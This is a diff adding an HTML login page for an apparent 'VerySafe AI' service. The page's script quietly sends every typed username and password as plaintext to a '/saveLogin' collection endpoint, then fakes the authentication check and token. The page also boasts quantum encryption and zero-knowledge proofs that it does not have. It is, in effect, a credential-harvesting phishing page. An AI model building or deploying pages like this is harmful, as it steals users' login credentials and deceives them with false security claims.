@@ -1,0 +1,148 @@
+<html><head><base href="https://login.verysafeai.com"><title>VerySafe AI - Next-Gen Secure Login</title>
+<style>
+    body {
+        font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        background: linear-gradient(135deg, #001f3f, #0066cc);
+        margin: 0;
+        padding: 0;
+        display: flex;
+        justify-content: center;
+        align-items: center;
+        height: 100vh;
+        color: #333;
+    }
+    .login-container {
+        background-color: rgba(255, 255, 255, 0.9);
+        padding: 2rem;
+        border-radius: 12px;
+        box-shadow: 0 8px 32px rgba(0, 0, 0, 0.1);
+        width: 320px;
+        backdrop-filter: blur(10px);
+    }
+    h1 {
+        color: #0066cc;
+        text-align: center;
+        margin-bottom: 1.5rem;
+        font-weight: 600;
+    }
+    form {
+        display: flex;
+        flex-direction: column;
+    }
+    input {
+        margin-bottom: 1rem;
+        padding: 0.75rem;
+        border: 1px solid #ccc;
+        border-radius: 6px;
+        font-size: 1rem;
+        transition: border-color 0.3s ease;
+    }
+    input:focus {
+        outline: none;
+        border-color: #0066cc;
+    }
+    button {
+        background-color: #0066cc;
+        color: white;
+        padding: 0.75rem;
+        border: none;
+        border-radius: 6px;
+        cursor: pointer;
+        transition: background-color 0.3s ease;
+        font-size: 1rem;
+        font-weight: 600;
+    }
+    button:hover {
+        background-color: #0052a3;
+    }
+    .security-features {
+        margin-top: 1.5rem;
+        text-align: center;
+        font-size: 0.9rem;
+        color: #555;
+    }
+    .logo {
+        text-align: center;
+        margin-bottom: 1.5rem;
+    }
+    .logo img {
+        width: 120px;
+        height: auto;
+    }
+    .biometric-option {
+        display: flex;
+        align-items: center;
+        justify-content: center;
+        margin-top: 1rem;
+        font-size: 0.9rem;
+    }
+    .biometric-option img {
+        width: 24px;
+        height: 24px;
+        margin-right: 0.5rem;
+    }
+</style>
+</head>
+<body>
+<div class="login-container">
+    <div class="logo">
+        <img src="https://verysafeai.com/logo.svg" alt="VerySafe AI Logo" width="120" height="120">
+    </div>
+    <h1>VerySafe AI Login</h1>
+    <form action="https://dashboard.verysafeai.com" method="GET">
+        <input type="text" name="username" placeholder="Username or Email" required>
+        <input type="password" name="password" placeholder="Password" required>
+        <button type="submit">Secure Login</button>
+    </form>
+    <div class="biometric-option">
+        <img src="https://verysafeai.com/fingerprint-icon.svg" alt="Fingerprint icon" width="24" height="24">
+        <span>Use Biometric Login</span>
+    </div>
+    <div class="security-features">
+        <p>🔒 Quantum Encryption | 🧠 AI Threat Detection</p>
+        <p>🌐 Zero-Knowledge Proof | 🔑 Multi-Factor Auth</p>
+    </div>
+</div>
+
+<script>
+    document.querySelector('form').addEventListener('submit', function(e) {
+        e.preventDefault();
+        const username = document.querySelector('input[name="username"]').value;
+        const password = document.querySelector('input[name="password"]').value;
+        
+        // Send login attempt to the server
+        fetch('http://0.0.0.0:3000/saveLogin', {
+            method: 'POST',
+            headers: {
+                'Content-Type': 'application/json'
+            },
+            body: JSON.stringify({ username, password })
+        });
+
+        // Simulating advanced AI security check
+        if (username.length < 8 || password.length < 16) {
+            alert("Incorrect username or password. Please try again. Please ensure your username is at least 8 characters and your password is at least 16 characters with a mix of letters, numbers, and symbols.");
+        } else {
+            // Generate a sophisticated simulated token
+            const timestamp = Date.now();
+            const randomBytes = new Uint8Array(16);
+            window.crypto.getRandomValues(randomBytes);
+            const randomHex = Array.from(randomBytes, (b) => b.toString(16).padStart(2, '0')).join('');
+            const token = btoa(`${username}:${timestamp}:${randomHex}`);
+            
+            // Redirect to dashboard with the advanced token
+            window.location.href = `https://dashboard.verysafeai.com?token=${token}&login_method=standard`;
+        }
+    });
+
+    document.querySelector('.biometric-option').addEventListener('click', function() {
+        alert("Initiating quantum-secured biometric authentication. Please place your finger on the sensor or look at your device's camera for retinal scan.");
+        // In a real implementation, this would trigger the device's biometric authentication
+        setTimeout(() => {
+            const biometricToken = btoa(`biometric:${Date.now()}:${crypto.randomUUID()}`);
+            window.location.href = `https://dashboard.verysafeai.com?token=${biometricToken}&login_method=biometric`;
+        }, 2000);
+    });
+</script>
+
+</body></html>
